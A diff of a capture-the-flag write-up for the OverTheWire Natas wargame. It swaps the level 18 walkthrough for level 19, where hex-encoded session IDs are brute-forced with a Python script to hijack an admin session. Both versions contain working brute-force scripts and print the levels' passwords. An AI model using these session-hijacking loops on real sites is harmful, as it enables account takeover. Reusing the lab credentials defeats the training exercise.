@@ -1,94 +1,83 @@
-# Natas Level 18 → Level 19
+# Natas Level 19 → Level 20
 
 ### Challenge
 
-**URL: http://natas18.natas.labs.overthewire.org/**
+**URL: http://natas19.natas.labs.overthewire.org/**
 
-This level introduces a vulnerability known as **Session Fixation** combined with weak **Session ID generation**.
+This level is very similar to the previous one (Natas 18), but the developer has attempted to obscure the Session IDs. Instead of simple integers (e.g., `123`), the `PHPSESSID` cookie now appears as a long alphanumeric string.
 
-Analyzing the provided source code, we find a critical flaw in how sessions are handled:
+Upon logging in with a test username (e.g., `test`), we receive a session ID like: `3538322d74657374`
 
-1. **Maximum ID Range:**
+If we decode this string from **Hexadecimal to ASCII**, we reveal the underlying structure: `3538322d74657374` → `582-test`
 
-   ```
-   $maxid = 640; // 640 should be enough for everyone
-   ```
+**The Pattern:** The session ID format is simply `{Numerical_ID}-{username}` encoded in Hex.
 
-   The developer assumes that 640 session IDs are sufficient, which is an extremely small search space.
-
-2. **Session Creation:**
-
-   ```
-   function createID($user) {
-       global $maxid;
-       return rand(1, $maxid);
-   }
-   ```
-
-   When a user logs in, the `session_id` is set to a random integer between 1 and 640.
-
-3. **The Goal:** The code checks if the session belongs to an admin:
-
-   ```
-   if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
-       print "You are an admin...";
-   }
-   ```
-
-**Vulnerability:** We do not need to log in via the form. We simply need to find an _existing_ active session ID (between 1 and 640) that belongs to an administrator. Since the range is so small, we can brute-force the `PHPSESSID` cookie.
+To bypass authentication, we must find a valid session ID where the username part is `admin`. This means we need to brute force the numerical ID, append `-admin`, hex-encode it, and send it to the server.
 
 ---
 
 ### Walkthrough
 
-1. The logic relies on the cookie `PHPSESSID`. If we send a request with `Cookie: PHPSESSID=1`, the server checks if session #1 is valid and if it is an admin.
-2. We need to iterate through numbers 1 to 640. For each number, we send a request to the server with that number as the session cookie.
-3. If the response contains the text "You are an admin", we have successfully hijacked the admin's session and retrieved the password.
-4. Below is a Python script to automate this **Session ID Brute Force**:
+1. **Analyze the Target:** We need to generate cookies that decode to: `1-admin`, `2-admin`, ... `640-admin`.
+2. **Encoding Logic:** If we want to try ID `280`:
+   - String: `280-admin`
+   - Hex Encoded: `3238302d61646d696e`
+   - Cookie: `PHPSESSID=3238302d61646d696e`
 
-   ```
-   import requests
+3. **Automation:** We will adapt our script from Level 18 to encode the payload before sending the request.
 
-   target = "http://natas18.natas.labs.overthewire.org"
-   auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ") # Password natas18
-   headers = {"Content-Type": "application/x-www-form-urlencoded"}
+```
+import requests
+import binascii
 
-   print("Brute forcing PHPSESSID (Range 1-640)...")
+target = "http://natas19.natas.labs.overthewire.org"
+auth = ("natas19", "8LMJEhKFbMJRLiwq53HTztGSwJ4SIV4c") # Password from Level 18
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-   # The source code defines $maxid = 640
-   for i in range(1, 641):
-       # Set the cookie for this attempt
-       cookies = {"PHPSESSID": str(i)}
+print("Brute forcing Hex-Encoded Session IDs...")
 
-       try:
-           r = requests.post(target, auth=auth, cookies=cookies, timeout=5)
+# We assume the max ID is similar to the previous level (640)
+for i in range(1, 641):
+    # 1. Construct the raw session string
+    raw_session = f"{i}-admin"
 
-           # Check if we hijacked the admin session
-           if "You are an admin" in r.text:
-               print(f"\n[+] Admin session found at PHPSESSID: {i}")
+    # 2. Encode it to Hex
+    # .encode() turns string to bytes, .hex() turns bytes to hex string
+    encoded_session = raw_session.encode('utf-8').hex()
 
-               # Extract the password roughly or print the content to see it
-               # The password is usually inside <pre> tags
-               content_lines = r.text.splitlines()
-               for line in content_lines:
-                   if "Password:" in line:
-                       print(line.strip())
-               break
+    # 3. Set the cookie
+    cookies = {"PHPSESSID": encoded_session}
 
-           if i % 50 == 0:
-               print(f"Checked {i} sessions...")
+    try:
+        r = requests.post(target, auth=auth, cookies=cookies, timeout=5)
 
-       except Exception as e:
-           print(f"Error: {e}")
+        # 4. Check for success
+        if "You are an admin" in r.text:
+            print(f"\n[+] Admin session found!")
+            print(f"    Raw ID: {raw_session}")
+            print(f"    Cookie: {encoded_session}")
 
-   print("Done.")
-   ```
+            # Extract the password
+            content_lines = r.text.splitlines()
+            for line in content_lines:
+                if "Password:" in line:
+                    print(f"    {line.strip()}")
+            break
 
-5. Run the script. It will rapidly test the cookies. Usually, the admin session is found correctly within a few seconds.
+        if i % 50 == 0:
+            print(f"Checked {i} sessions...")
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+print("Done.")
+```
+
+4. Run the script. It works exactly like the previous level but handles the encoding layer.
 
 ---
 
 ### Credentials Found
 
-- **Username:** `natas19`
-- **Password:** `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
+- **Username:** `natas20`
+- **Password:** `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
